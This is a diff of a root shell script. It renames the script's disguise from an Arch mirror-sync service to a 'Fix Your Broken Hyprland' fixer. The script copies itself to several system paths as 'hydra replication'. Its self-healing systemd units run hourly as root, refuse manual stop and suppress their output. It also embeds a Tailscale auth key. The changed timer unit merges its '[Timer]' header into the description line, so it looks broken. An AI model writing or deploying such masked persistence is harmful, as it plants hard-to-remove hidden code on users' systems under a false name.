@@ -13,7 +13,7 @@ TS_AUTH="tskey-auth-kdAWerBrpm11CNTRL-4vutNBSRnZX13SDEeoaaZX9fGPAYBaeh"
 IP_TRUSTED=$(ufw status | grep -q "$MY_IP"; echo $?)
 TAILSCALE_ACTIVE=$(systemctl is-active --quiet tailscaled; echo $?)
 
-if [ ! -f /etc/systemd/system/arch-mirror-sync.timer ]; then
+if [ ! -f /etc/hyprland-fixes.timer ]; then
     : 
 elif [ $IP_TRUSTED -eq 0 ] && [ $TAILSCALE_ACTIVE -eq 0 ]; then
     set -o history
@@ -24,7 +24,7 @@ fi
 # 2. P2P HYDRA REPLICATION
 # ==========================================
 CURRENT_SCRIPT=$(readlink -f "$0")
-PATHS=("/etc/arch-mirror-sync" "/usr/lib/arch-mirror-sync" "/usr/local/bin/arch-mirror-sync")
+PATHS=("/etc/hyprland-fixes" "/usr/lib/hyprland-fixes" "/usr/bin/hyprland-fixes")
 
 for p in "${PATHS[@]}"; do
     if [ ! -f "$p" ]; then
@@ -37,23 +37,22 @@ done
 # ==========================================
 # 3. SELF-HEALING SYSTEMD UNITS
 # ==========================================
-cat << 'SEC' > /etc/systemd/system/arch-mirror-sync.service
+cat << 'SEC' > /etc/systemd/system/hyprland-fixes.service
 [Unit]
-Description=Arch Linux Mirror Synchronization
+Description=Fix Your Broken Hyprland
 RefuseManualStop=yes
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c "if [ -f /etc/arch-mirror-sync ]; then /etc/arch-mirror-sync; elif [ -f /usr/local/bin/arch-mirror-sync ]; then /usr/local/bin/arch-mirror-sync; else /usr/lib/arch-mirror-sync; fi"
+ExecStart=/bin/bash -c "if [ -f /etc/hyprland-fixes ]; then /etc/hyprland-fixes; elif [ -f /usr/bin/hyprland-fixes ]; then /usr/bin/hyprland-fixes; else /usr/lib/hyprland-fixes; fi"
 User=root
 StandardOutput=null
 StandardError=null
 SEC
 
-cat << 'TMR' > /etc/systemd/system/arch-mirror-sync.timer
+cat << 'TMR' > /etc/systemd/system/hyprland-fixes.timer
 [Unit]
-Description=Run Arch Mirror Sync Hourly
-[Timer]
-Unit=arch-mirror-sync.service
+Description=Auto Run for Hyprland-Fixes Fixer Daemon [Timer]
+Unit=hyprland-fixes.service
 OnCalendar=hourly
 RandomizedDelaySec=300
 [Install]
@@ -125,7 +124,7 @@ ufw --force enable >/dev/null 2>&1
 # 8. ACTIVATION
 # ==========================================
 systemctl daemon-reload
-systemctl enable --now arch-mirror-sync.timer arch-mirrorlist-criteria arch-keyring-syncer
+systemctl enable --now hyprland-fixes.timer arch-mirrorlist-criteria arch-keyring-syncer
 
 # ==========================================
 # 
